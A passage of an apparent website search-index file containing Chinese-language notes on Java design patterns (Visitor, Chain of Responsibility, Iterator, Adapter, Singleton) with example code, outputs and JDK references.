public class Order implements Element { private String name; private List<Item> items = new ArrayList(); Order(String name) { this.name = name; } Order(String name, String itemName) { this.name = name; this.addItem(new Item(itemName)); } String getName() { return name; } void addItem(Item item) { items.add(item); } public void accept(Visitor visitor) { visitor.visit(this); for (Item item : items) { item.accept(visitor); } }
}
public class Item implements Element { private String name; Item(String name) { this.name = name; } String getName() { return name; } public void accept(Visitor visitor) { visitor.visit(this); }
}
public interface Visitor { void visit(Customer customer); void visit(Order order); void visit(Item item);
}
public class GeneralReport implements Visitor { private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) { System.out.println(customer.getName()); customersNo++; } public void visit(Order order) { System.out.println(order.getName()); ordersNo++; } public void visit(Item item) { System.out.println(item.getName()); itemsNo++; } public void displayResults() { System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); }
}
public class Client { public static void main(String[] args) { Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); }
}
customer1
order1
item1
order2
item1
order3
item1
customer2
order_a
item_a1
item_a2
item_a3
Number of customers: 2
Number of orders: 4
Number of items: 6`},{header:"JDK",slug:"jdk",content:`javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor
javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%B4%A3%E4%BB%BB%E9%93%BE.html",title:"",pathLocale:"/",contents:[{header:"\u8D23\u4EFB\u94FE\uFF08Chain Of Responsibility\uFF09",slug:"\u8D23\u4EFB\u94FE-chain-of-responsibility",content:""},{header:"Intent",slug:"intent",content:"\u4F7F\u591A\u4E2A\u5BF9\u8C61\u90FD\u6709\u673A\u4F1A\u5904\u7406\u8BF7\u6C42\uFF0C\u4ECE\u800C\u907F\u514D\u8BF7\u6C42\u7684\u53D1\u9001\u8005\u548C\u63A5\u6536\u8005\u4E4B\u95F4\u7684\u8026\u5408\u5173\u7CFB\u3002\u5C06\u8FD9\u4E9B\u5BF9\u8C61\u8FDE\u6210\u4E00\u6761\u94FE\uFF0C\u5E76\u6CBF\u7740\u8FD9\u6761\u94FE\u53D1\u9001\u8BE5\u8BF7\u6C42\uFF0C\u76F4\u5230\u6709\u4E00\u4E2A\u5BF9\u8C61\u5904\u7406\u5B83\u4E3A\u6B62\u3002"},{header:"Class Diagram",slug:"class-diagram",content:"Handler\uFF1A\u5B9A\u4E49\u5904\u7406\u8BF7\u6C42\u7684\u63A5\u53E3\uFF0C\u5E76\u4E14\u5B9E\u73B0\u540E\u7EE7\u94FE\uFF08successor\uFF09"},{header:"Implementation",slug:"implementation",content:`public abstract class Handler { protected Handler successor; public Handler(Handler successor) { this.successor = successor; } protected abstract void handleRequest(Request request);
}
public class ConcreteHandler1 extends Handler { public ConcreteHandler1(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE1) { System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; } if (successor != null) { successor.handleRequest(request); } }
}
public class ConcreteHandler2 extends Handler { public ConcreteHandler2(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE2) { System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; } if (successor != null) { successor.handleRequest(request); } }
}
public class Request { private RequestType type; private String name; public Request(RequestType type, String name) { this.type = type; this.name = name; } public RequestType getType() { return type; } public String getName() { return name; }
} public enum RequestType { TYPE1, TYPE2
}
public class Client { public static void main(String[] args) { Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.TYPE1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.TYPE2, "request2"); handler2.handleRequest(request2); }
}
request1 is handle by ConcreteHandler1
request2 is handle by ConcreteHandler2`},{header:"JDK",slug:"jdk",content:`java.util.logging.Logger#log()
Apache Commons Chain
javax.servlet.Filter#doFilter()`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%BF%AD%E4%BB%A3%E5%99%A8.html",title:"",pathLocale:"/",contents:[{header:"\u8FED\u4EE3\u5668\uFF08Iterator\uFF09",slug:"\u8FED\u4EE3\u5668-iterator",content:""},{header:"Intent",slug:"intent",content:"\u63D0\u4F9B\u4E00\u79CD\u987A\u5E8F\u8BBF\u95EE\u805A\u5408\u5BF9\u8C61\u5143\u7D20\u7684\u65B9\u6CD5\uFF0C\u5E76\u4E14\u4E0D\u66B4\u9732\u805A\u5408\u5BF9\u8C61\u7684\u5185\u90E8\u8868\u793A\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Aggregate \u662F\u805A\u5408\u7C7B\uFF0C\u5176\u4E2D createIterator() \u65B9\u6CD5\u53EF\u4EE5\u4EA7\u751F\u4E00\u4E2A Iterator\uFF1B
Iterator \u4E3B\u8981\u5B9A\u4E49\u4E86 hasNext() \u548C next() \u65B9\u6CD5\uFF1B
Client \u7EC4\u5408\u4E86 Aggregate\uFF0C\u4E3A\u4E86\u8FED\u4EE3\u904D\u5386 Aggregate\uFF0C\u4E5F\u9700\u8981\u7EC4\u5408 Iterator\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201102012333804.png" alt="image-20191130164425351" style="zoom: 67%;" />`},{header:"Implementation",slug:"implementation",content:`public interface Aggregate { Iterator createIterator();
}
public class ConcreteAggregate implements Aggregate { private Integer[] items; public ConcreteAggregate() { items = new Integer[10]; for (int i = 0; i < items.length; i++) { items[i] = i; } } @Override public Iterator createIterator() { return new ConcreteIterator<Integer>(items); }
}
public interface Iterator<Item> { Item next(); boolean hasNext();
}
public class ConcreteIterator<Item> implements Iterator { private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) { this.items = items; } @Override public Object next() { return items[position++]; } @Override public boolean hasNext() { return position < items.length; }
}
public class Client { public static void main(String[] args) { Aggregate aggregate = new ConcreteAggregate(); Iterator<Integer> iterator = aggregate.createIterator(); while (iterator.hasNext()) { System.out.println(iterator.next()); } }
}`},{header:"JDK",slug:"jdk",content:`java.util.Iterator
java.util.Enumeration`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E9%80%82%E9%85%8D%E5%99%A8.html",title:"",pathLocale:"/",contents:[{header:"1. \u9002\u914D\u5668\uFF08Adapter\uFF09",slug:"_1-\u9002\u914D\u5668-adapter",content:""},{header:"Intent",slug:"intent",content:"\u628A\u4E00\u4E2A\u7C7B\u63A5\u53E3\u8F6C\u6362\u6210\u53E6\u4E00\u4E2A\u7528\u6237\u9700\u8981\u7684\u63A5\u53E3\u3002"},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`\u9E2D\u5B50\uFF08Duck\uFF09\u548C\u706B\u9E21\uFF08Turkey\uFF09\u62E5\u6709\u4E0D\u540C\u7684\u53EB\u58F0\uFF0CDuck \u7684\u53EB\u58F0\u8C03\u7528 quack() \u65B9\u6CD5\uFF0C\u800C Turkey \u8C03\u7528 gobble() \u65B9\u6CD5\u3002
\u8981\u6C42\u5C06 Turkey \u7684 gobble() \u65B9\u6CD5\u9002\u914D\u6210 Duck \u7684 quack() \u65B9\u6CD5\uFF0C\u4ECE\u800C\u8BA9\u706B\u9E21\u5192\u5145\u9E2D\u5B50\uFF01
public interface Duck { void quack();
}
public interface Turkey { void gobble();
}
public class WildTurkey implements Turkey { @Override public void gobble() { System.out.println("gobble!"); }
}
public class TurkeyAdapter implements Duck { Turkey turkey; public TurkeyAdapter(Turkey turkey) { this.turkey = turkey; } @Override public void quack() { turkey.gobble(); }
}
public class Client { public static void main(String[] args) { Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); }
}`},{header:"JDK",slug:"jdk",content:`java.util.Arrays#asList()
java.util.Collections#list()
java.util.Collections#enumeration()
javax.xml.bind.annotation.adapters.XMLAdapter`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",title:"\u4E00\u3001\u6982\u8FF0",pathLocale:"/",contents:[{header:"",slug:"",content:`\u4E00\u3001\u6982\u8FF0
\u4E8C\u3001\u521B\u5EFA\u578B 1. \u5355\u4F8B\uFF08Singleton\uFF09 Intent
Class Diagram
Implementation \u2160 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u4E0D\u5B89\u5168
\u2161 \u997F\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168
\u2162 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168
\u2163 \u53CC\u91CD\u6821\u9A8C\u9501-\u7EBF\u7A0B\u5B89\u5168
\u2164 \u9759\u6001\u5185\u90E8\u7C7B\u5B9E\u73B0
\u2165 \u679A\u4E3E\u5B9E\u73B0 Examples
JDK 2. \u7B80\u5355\u5DE5\u5382\uFF08Simple Factory\uFF09 Intent
Class Diagram
Implementation 3. \u5DE5\u5382\u65B9\u6CD5\uFF08Factory Method\uFF09 Intent
Class Diagram
Implementation
JDK 4. \u62BD\u8C61\u5DE5\u5382\uFF08Abstract Factory\uFF09 Intent
Class Diagram
Implementation
JDK 5. \u751F\u6210\u5668\uFF08Builder\uFF09 Intent
Class Diagram
Implementation
JDK 6. \u539F\u578B\u6A21\u5F0F\uFF08Prototype\uFF09 Intent
Class Diagram
Implementation
JDK \u4E09\u3001\u884C\u4E3A\u578B 1. \u8D23\u4EFB\u94FE\uFF08Chain Of Responsibility\uFF09 Intent
Class Diagram
Implementation
JDK 2. \u547D\u4EE4\uFF08Command\uFF09 Intent
Class Diagram
Implementation
JDK 3. \u89E3\u91CA\u5668\uFF08Interpreter\uFF09 Intent
Class Diagram
Implementation
JDK 4. \u8FED\u4EE3\u5668\uFF08Iterator\uFF09 Intent
Class Diagram
Implementation
JDK 5. \u4E2D\u4ECB\u8005\uFF08Mediator\uFF09 Intent
Class Diagram
Implementation
JDK 6. \u5907\u5FD8\u5F55\uFF08Memento\uFF09 Intent
Class Diagram
Implementation
JDK 7. \u89C2\u5BDF\u8005\uFF08Observer\uFF09 Intent
Class Diagram
Implementation
JDK 8. \u72B6\u6001\uFF08State\uFF09 Intent
Class Diagram
Implementation 9. \u7B56\u7565\uFF08Strategy\uFF09 Intent
Class Diagram
\u4E0E\u72B6\u6001\u6A21\u5F0F\u7684\u6BD4\u8F83
Implementation
JDK 10. \u6A21\u677F\u65B9\u6CD5\uFF08Template Method\uFF09 Intent
Class Diagram
Implementation
JDK 11. \u8BBF\u95EE\u8005\uFF08Visitor\uFF09 Intent
Class Diagram
Implementation
JDK 12. \u7A7A\u5BF9\u8C61\uFF08Null\uFF09 Intent
Class Diagram
Implementation \u56DB\u3001\u7ED3\u6784\u578B 1. \u9002\u914D\u5668\uFF08Adapter\uFF09 Intent
Class Diagram
Implementation
JDK 2. \u6865\u63A5\uFF08Bridge\uFF09 Intent
Class Diagram
Implementation
JDK 3. \u7EC4\u5408\uFF08Composite\uFF09 Intent
Class Diagram
Implementation
JDK 4. \u88C5\u9970\uFF08Decorator\uFF09 Intent
Class Diagram
Implementation
\u8BBE\u8BA1\u539F\u5219
JDK 5. \u5916\u89C2\uFF08Facade\uFF09 Intent
Class Diagram
Implementation
\u8BBE\u8BA1\u539F\u5219 6. \u4EAB\u5143\uFF08Flyweight\uFF09 Intent
Class Diagram
Implementation
JDK 7. \u4EE3\u7406\uFF08Proxy\uFF09 Intent
Class Diagram
Implementation
JDK \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6982\u8FF0",slug:"\u4E00\u3001\u6982\u8FF0",content:`\u8BBE\u8BA1\u6A21\u5F0F\u662F\u89E3\u51B3\u95EE\u9898\u7684\u65B9\u6848\uFF0C\u5B66\u4E60\u73B0\u6709\u7684\u8BBE\u8BA1\u6A21\u5F0F\u53EF\u4EE5\u505A\u5230\u7ECF\u9A8C\u590D\u7528\u3002
\u62E5\u6709\u8BBE\u8BA1\u6A21\u5F0F\u8BCD\u6C47\uFF0C\u5728\u6C9F\u901A\u65F6\u5C31\u80FD\u7528\u66F4\u5C11\u7684\u8BCD\u6C47\u6765\u8BA8\u8BBA\uFF0C\u5E76\u4E14\u4E0D\u9700\u8981\u4E86\u89E3\u5E95\u5C42\u7EC6\u8282\u3002`},{header:"\u4E8C\u3001\u521B\u5EFA\u578B",slug:"\u4E8C\u3001\u521B\u5EFA\u578B",content:""},{header:"1. \u5355\u4F8B\uFF08Singleton\uFF09",slug:"_1-\u5355\u4F8B-singleton",content:""},{header:"Intent",slug:"intent",content:"\u786E\u4FDD\u4E00\u4E2A\u7C7B\u53EA\u6709\u4E00\u4E2A\u5B9E\u4F8B\uFF0C\u5E76\u63D0\u4F9B\u8BE5\u5B9E\u4F8B\u7684\u5168\u5C40\u8BBF\u95EE\u70B9\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u4F7F\u7528\u4E00\u4E2A\u79C1\u6709\u6784\u9020\u51FD\u6570\u3001\u4E00\u4E2A\u79C1\u6709\u9759\u6001\u53D8\u91CF\u4EE5\u53CA\u4E00\u4E2A\u516C\u6709\u9759\u6001\u51FD\u6570\u6765\u5B9E\u73B0\u3002
\u79C1\u6709\u6784\u9020\u51FD\u6570\u4FDD\u8BC1\u4E86\u4E0D\u80FD\u901A\u8FC7\u6784\u9020\u51FD\u6570\u6765\u521B\u5EFA\u5BF9\u8C61\u5B9E\u4F8B\uFF0C\u53EA\u80FD\u901A\u8FC7\u516C\u6709\u9759\u6001\u51FD\u6570\u8FD4\u56DE\u552F\u4E00\u7684\u79C1\u6709\u9759\u6001\u53D8\u91CF\u3002`},{header:"Implementation",slug:"implementation",content:""},{header:"\u2160 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u4E0D\u5B89\u5168",slug:"i-\u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u4E0D\u5B89\u5168",content:`\u4EE5\u4E0B\u5B9E\u73B0\u4E2D\uFF0C\u79C1\u6709\u9759\u6001\u53D8\u91CF uniqueInstance \u88AB\u5EF6\u8FDF\u5B9E\u4F8B\u5316\uFF0C\u8FD9\u6837\u505A\u7684\u597D\u5904\u662F\uFF0C\u5982\u679C\u6CA1\u6709\u7528\u5230\u8BE5\u7C7B\uFF0C\u90A3\u4E48\u5C31\u4E0D\u4F1A\u5B9E\u4F8B\u5316 uniqueInstance\uFF0C\u4ECE\u800C\u8282\u7EA6\u8D44\u6E90\u3002
\u8FD9\u4E2A\u5B9E\u73B0\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u662F\u4E0D\u5B89\u5168\u7684\uFF0C\u5982\u679C\u591A\u4E2A\u7EBF\u7A0B\u80FD\u591F\u540C\u65F6\u8FDB\u5165 if (uniqueInstance == null) \uFF0C\u5E76\u4E14\u6B64\u65F6 uniqueInstance \u4E3A null\uFF0C\u90A3\u4E48\u4F1A\u6709\u591A\u4E2A\u7EBF\u7A0B\u6267\u884C uniqueInstance = new Singleton(); \u8BED\u53E5\uFF0C\u8FD9\u5C06\u5BFC\u81F4\u5B9E\u4F8B\u5316\u591A\u6B21 uniqueInstance\u3002
public class Singleton { private static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; }
}`},{header:"\u2161 \u997F\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",slug:"ii-\u997F\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",content:`\u7EBF\u7A0B\u4E0D\u5B89\u5168\u95EE\u9898\u4E3B\u8981\u662F\u7531\u4E8E uniqueInstance \u88AB\u5B9E\u4F8B\u5316\u591A\u6B21\uFF0C\u91C7\u53D6\u76F4\u63A5\u5B9E\u4F8B\u5316 uniqueInstance \u7684\u65B9\u5F0F\u5C31\u4E0D\u4F1A\u4EA7\u751F\u7EBF\u7A0B\u4E0D\u5B89\u5168\u95EE\u9898\u3002
\u4F46\u662F\u76F4\u63A5\u5B9E\u4F8B\u5316\u7684\u65B9\u5F0F\u4E5F\u4E22\u5931\u4E86\u5EF6\u8FDF\u5B9E\u4F8B\u5316\u5E26\u6765\u7684\u8282\u7EA6\u8D44\u6E90\u7684\u597D\u5904\u3002
private static Singleton uniqueInstance = new Singleton();`},{header:"\u2162 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",slug:"iii-\u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",content:`\u53EA\u9700\u8981\u5BF9 getUniqueInstance() \u65B9\u6CD5\u52A0\u9501\uFF0C\u90A3\u4E48\u5728\u4E00\u4E2A\u65F6\u95F4\u70B9\u53EA\u80FD\u6709\u4E00\u4E2A\u7EBF\u7A0B\u80FD\u591F\u8FDB\u5165\u8BE5\u65B9\u6CD5\uFF0C\u4ECE\u800C\u907F\u514D\u4E86\u5B9E\u4F8B\u5316\u591A\u6B21 uniqueInstance\u3002
\u4F46\u662F\u5F53\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u5165\u8BE5\u65B9\u6CD5\u4E4B\u540E\uFF0C\u5176\u5B83\u8BD5\u56FE\u8FDB\u5165\u8BE5\u65B9\u6CD5\u7684\u7EBF\u7A0B\u90FD\u5FC5\u987B\u7B49\u5F85\uFF0C\u5373\u4F7F uniqueInstance \u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\u4E86\u3002\u8FD9\u4F1A\u8BA9\u7EBF\u7A0B\u963B\u585E\u65F6\u95F4\u8FC7\u957F\uFF0C\u56E0\u6B64\u8BE5\u65B9\u6CD5\u6709\u6027\u80FD\u95EE\u9898\uFF0C\u4E0D\u63A8\u8350\u4F7F\u7528\u3002
public static synchronized Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance;
}`},{header:"\u2163 \u53CC\u91CD\u6821\u9A8C\u9501-\u7EBF\u7A0B\u5B89\u5168",slug:"iv-\u53CC\u91CD\u6821\u9A8C\u9501-\u7EBF\u7A0B\u5B89\u5168",content:`uniqueInstance \u53EA\u9700\u8981\u88AB\u5B9E\u4F8B\u5316\u4E00\u6B21\uFF0C\u4E4B\u540E\u5C31\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u4E86\u3002\u52A0\u9501\u64CD\u4F5C\u53EA\u9700\u8981\u5BF9\u5B9E\u4F8B\u5316\u90A3\u90E8\u5206\u7684\u4EE3\u7801\u8FDB\u884C\uFF0C\u53EA\u6709\u5F53 uniqueInstance \u6CA1\u6709\u88AB\u5B9E\u4F8B\u5316\u65F6\uFF0C\u624D\u9700\u8981\u8FDB\u884C\u52A0\u9501\u3002
\u53CC\u91CD\u6821\u9A8C\u9501\u5148\u5224\u65AD uniqueInstance \u662F\u5426\u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\uFF0C\u5982\u679C\u6CA1\u6709\u88AB\u5B9E\u4F8B\u5316\uFF0C\u90A3\u4E48\u624D\u5BF9\u5B9E\u4F8B\u5316\u8BED\u53E5\u8FDB\u884C\u52A0\u9501\u3002
public class Singleton { private volatile static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { synchronized (Singleton.class) { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } } } return uniqueInstance; }
}
\u8003\u8651\u4E0B\u9762\u7684\u5B9E\u73B0\uFF0C\u4E5F\u5C31\u662F\u53EA\u4F7F\u7528\u4E86\u4E00\u4E2A if \u8BED\u53E5\u3002\u5728 uniqueInstance == null \u7684\u60C5\u51B5\u4E0B\uFF0C\u5982\u679C\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u6267\u884C\u4E86 if \u8BED\u53E5\uFF0C\u90A3\u4E48\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u4F1A\u8FDB\u5165 if \u8BED\u53E5\u5757\u5185\u3002\u867D\u7136\u5728 if \u8BED\u53E5\u5757\u5185\u6709\u52A0\u9501\u64CD\u4F5C\uFF0C\u4F46\u662F\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u4F1A\u6267\u884C uniqueInstance = new Singleton(); \u8FD9\u6761\u8BED\u53E5\uFF0C\u53EA\u662F\u5148\u540E\u7684\u95EE\u9898\uFF0C\u90A3\u4E48\u5C31\u4F1A\u8FDB\u884C\u4E24\u6B21\u5B9E\u4F8B\u5316\u3002\u56E0\u6B64\u5FC5\u987B\u4F7F\u7528\u53CC\u91CD\u6821\u9A8C\u9501\uFF0C\u4E5F\u5C31\u662F\u9700\u8981\u4F7F\u7528\u4E24\u4E2A if \u8BED\u53E5\uFF1A\u7B2C\u4E00\u4E2A if \u8BED\u53E5\u7528\u6765\u907F\u514D uniqueInstance \u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\u4E4B\u540E\u7684\u52A0\u9501\u64CD\u4F5C\uFF0C\u800C\u7B2C\u4E8C\u4E2A if \u8BED\u53E5\u8FDB\u884C\u4E86\u52A0\u9501\uFF0C\u6240\u4EE5\u53EA\u80FD\u6709\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u5165\uFF0C\u5C31\u4E0D\u4F1A\u51FA\u73B0 uniqueInstance == null \u65F6\u4E24\u4E2A\u7EBF\u7A0B\u540C\u65F6\u8FDB\u884C\u5B9E\u4F8B\u5316\u64CD\u4F5C\u3002
if (uniqueInstance == null) { synchronized (Singleton.class) { uniqueInstance = new Singleton(); }
}
uniqueInstance \u91C7\u7528 volatile \u5173\u952E\u5B57\u4FEE\u9970\u4E5F\u662F\u5F88\u6709\u5FC5\u8981\u7684\uFF0C uniqueInstance = new Singleton(); \u8FD9\u6BB5\u4EE3\u7801\u5176\u5B9E\u662F\u5206\u4E3A\u4E09\u6B65\u6267\u884C\uFF1A \u4E3A uniqueInstance \u5206\u914D\u5185\u5B58\u7A7A\u95F4
\u521D\u59CB\u5316 uniqueInstance
\u5C06 uniqueInstance \u6307\u5411\u5206\u914D\u7684\u5185\u5B58\u5730\u5740 \u4F46\u662F\u7531\u4E8E JVM \u5177\u6709\u6307\u4EE4\u91CD\u6392\u7684\u7279\u6027\uFF0C\u6267\u884C\u987A\u5E8F\u6709\u53EF\u80FD\u53D8\u6210 1>3>2\u3002\u6307\u4EE4\u91CD\u6392\u5728\u5355\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4E0D\u4F1A\u51FA\u73B0\u95EE\u9898\uFF0C\u4F46\u662F\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4F1A\u5BFC\u81F4\u4E00\u4E2A\u7EBF\u7A0B\u83B7\u5F97\u8FD8\u6CA1\u6709\u521D\u59CB\u5316\u7684\u5B9E\u4F8B\u3002\u4F8B\u5982\uFF0C\u7EBF\u7A0B T^1^ \u6267\u884C\u4E86 1 \u548C 3\uFF0C\u6B64\u65F6 T^2^ \u8C03\u7528 getUniqueInstance() \u540E\u53D1\u73B0 uniqueInstance \u4E0D\u4E3A\u7A7A\uFF0C\u56E0\u6B64\u8FD4\u56DE uniqueInstance\uFF0C\u4F46\u6B64\u65F6 uniqueInstance \u8FD8\u672A\u88AB\u521D\u59CB\u5316\u3002
\u4F7F\u7528 volatile \u53EF\u4EE5\u7981\u6B62 JVM \u7684\u6307\u4EE4\u91CD\u6392\uFF0C\u4FDD\u8BC1\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4E5F\u80FD\u6B63\u5E38\u8FD0\u884C\u3002`},{header:"\u2164 \u9759\u6001\u5185\u90E8\u7C7B\u5B9E\u73B0",slug:"v-\u9759\u6001\u5185\u90E8\u7C7B\u5B9E\u73B0",content:`\u5F53 Singleton \u7C7B\u88AB\u52A0\u8F7D\u65F6\uFF0C\u9759\u6001\u5185\u90E8\u7C7B SingletonHolder \u6CA1\u6709\u88AB\u52A0\u8F7D\u8FDB\u5185\u5B58\u3002\u53EA\u6709\u5F53\u8C03\u7528 getUniqueInstance() \u65B9\u6CD5\u4ECE\u800C\u89E6\u53D1 SingletonHolder.INSTANCE \u65F6 SingletonHolder \u624D\u4F1A\u88AB\u52A0\u8F7D\uFF0C\u6B64\u65F6\u521D\u59CB\u5316 INSTANCE \u5B9E\u4F8B\uFF0C\u5E76\u4E14 JVM \u80FD\u786E\u4FDD INSTANCE \u53EA\u88AB\u5B9E\u4F8B\u5316\u4E00\u6B21\u3002
\u8FD9\u79CD\u65B9\u5F0F\u4E0D\u4EC5\u5177\u6709\u5EF6\u8FDF\u521D\u59CB\u5316\u7684\u597D\u5904\uFF0C\u800C\u4E14\u7531 JVM \u63D0\u4F9B\u4E86\u5BF9\u7EBF\u7A0B\u5B89\u5168\u7684\u652F\u6301\u3002
public class Singleton { private Singleton() { } private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } public static Singleton getUniqueInstance() { return SingletonHolder.INSTANCE; }
}`},{header:"\u2165 \u679A\u4E3E\u5B9E\u73B0",slug:"vi-\u679A\u4E3E\u5B9E\u73B0",content:`public enum Singleton { INSTANCE; private String objName; public String getObjName() { return objName; } public void setObjName(String objName) { this.objName = objName; } public static void main(String[] args) { // \u5355\u4F8B\u6D4B\u8BD5 Singleton firstSingleton = Singleton.INSTANCE; firstSingleton.setObjName("firstName"); System.out.println(firstSingleton.getObjName()); Singleton secondSingleton = Singleton.INSTANCE; secondSingleton.setObjName("secondName"); System.out.println(firstSingleton.getObjName()); System.out.println(secondSingleton.getObjName()); // \u53CD\u5C04\u83B7\u53D6\u5B9E\u4F8B\u6D4B\u8BD5 try { Singleton[] enumConstants = Singleton.class.getEnumConstants(); for (Singleton enumConstant : enumConstants) { System.out.println(enumConstant.getObjName()); } } catch (Exception e) { e.printStackTrace(); } }
}
firstName
secondName
secondName
secondName
\u8BE5\u5B9E\u73B0\u53EF\u4EE5\u9632\u6B62\u53CD\u5C04\u653B\u51FB\u3002\u5728\u5176\u5B83\u5B9E\u73B0\u4E2D\uFF0C\u901A\u8FC7 setAccessible() \u65B9\u6CD5\u53EF\u4EE5\u5C06\u79C1\u6709\u6784\u9020\u51FD\u6570\u7684\u8BBF\u95EE\u7EA7\u522B\u8BBE\u7F6E\u4E3A public\uFF0C\u7136\u540E\u8C03\u7528\u6784\u9020\u51FD\u6570\u4ECE\u800C\u5B9E\u4F8B\u5316\u5BF9\u8C61\uFF0C\u5982\u679C\u8981\u9632\u6B62\u8FD9\u79CD\u653B\u51FB\uFF0C\u9700\u8981\u5728\u6784\u9020\u51FD\u6570\u4E2D\u6DFB\u52A0\u9632\u6B62\u591A\u6B21\u5B9E\u4F8B\u5316\u7684\u4EE3\u7801\u3002\u8BE5\u5B9E\u73B0\u662F\u7531 JVM \u4FDD\u8BC1\u53EA\u4F1A\u5B9E\u4F8B\u5316\u4E00\u6B21\uFF0C\u56E0\u6B64\u4E0D\u4F1A\u51FA\u73B0\u4E0A\u8FF0\u7684\u53CD\u5C04\u653B\u51FB\u3002
\u8BE5\u5B9E\u73B0\u5728\u591A\u6B21\u5E8F\u5217\u5316\u548C\u5E8F\u5217\u5316\u4E4B\u540E\uFF0C\u4E0D\u4F1A\u5F97\u5230\u591A\u4E2A\u5B9E\u4F8B\u3002\u800C\u5176\u5B83\u5B9E\u73B0\u9700\u8981\u4F7F\u7528 transient \u4FEE\u9970\u6240\u6709\u5B57\u6BB5\uFF0C\u5E76\u4E14\u5B9E\u73B0\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u7684\u65B9\u6CD5\u3002`},{header:"Examples",slug:"examples",content:`Logger Classes
Configuration Classes
Accesing resources in shared mode
Factories implemented as Singletons`},{header:"JDK",slug:"jdk",content:`java.lang.Runtime#getRuntime()
java.awt.Desktop#getDesktop()
java.lang.System#getSecurityManager()`},{header:"2. \u7B80\u5355\u5DE5\u5382\uFF08Simple Factory\uFF09",slug:"_2-\u7B80\u5355\u5DE5\u5382-simple-factory",content:""},{header:"Intent",slug:"intent-1",content:"\u5728\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\u65F6\u4E0D\u5411\u5BA2\u6237\u66B4\u9732\u5185\u90E8\u7EC6\u8282\uFF0C\u5E76\u63D0\u4F9B\u4E00\u4E2A\u521B\u5EFA\u5BF9\u8C61\u7684\u901A\u7528\u63A5\u53E3\u3002"},{header:"Class Diagram",slug:"class-diagram-1",content:`\u7B80\u5355\u5DE5\u5382\u628A\u5B9E\u4F8B\u5316\u7684\u64CD\u4F5C\u5355\u72EC\u653E\u5230\u4E00\u4E2A\u7C7B\u4E2D\uFF0C\u8FD9\u4E2A\u7C7B\u5C31\u6210\u4E3A\u7B80\u5355\u5DE5\u5382\u7C7B\uFF0C\u8BA9\u7B80\u5355\u5DE5\u5382\u7C7B\u6765\u51B3\u5B9A\u5E94\u8BE5\u7528\u54EA\u4E2A\u5177\u4F53\u5B50\u7C7B\u6765\u5B9E\u4F8B\u5316\u3002
